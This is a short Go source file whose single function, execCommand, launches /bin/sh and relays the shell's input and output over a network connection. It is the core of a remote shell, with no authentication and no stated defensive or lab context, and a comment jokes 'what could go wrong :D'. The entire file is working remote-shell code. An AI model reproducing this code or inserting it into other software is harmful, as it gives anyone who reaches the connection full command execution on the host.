package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
)

func execCommand(conn net.Conn) {
	fmt.Println("Executing shell...")
	// replace with command from cli
	cmd := exec.Command("/bin/sh")

	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Println("Error creating stdin pipe for cmd", err)
		return
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Println("Error creating stdout pipe for cmd", err)
		return
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Println("Error creating stderr pipe for cmd", err)
		return
	}

	defer func() {
		err := stdin.Close()
		if err != nil {
			log.Println("Error closing stdin pipe:", err)
		}

		err = stdout.Close()
		if err != nil {
			log.Println("Error closing stdout pipe:", err)
		}

		err = stderr.Close()
		if err != nil {
			log.Println("Error closing stdout pipe:", err)
		}
	}()

	if err := cmd.Start(); err != nil {
		log.Fatal("Error starting command:", err)
		return
	}

	go func() {
		// what could go wrong :D
		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			fmt.Fprintln(stdin, scanner.Text())
		}
	}()

	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			fmt.Fprintln(conn, scanner.Text())
		}
	}()

	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			fmt.Fprintln(conn, scanner.Text())
		}
	}()

	if err := cmd.Wait(); err != nil {
		log.Fatal(err)
	}
}
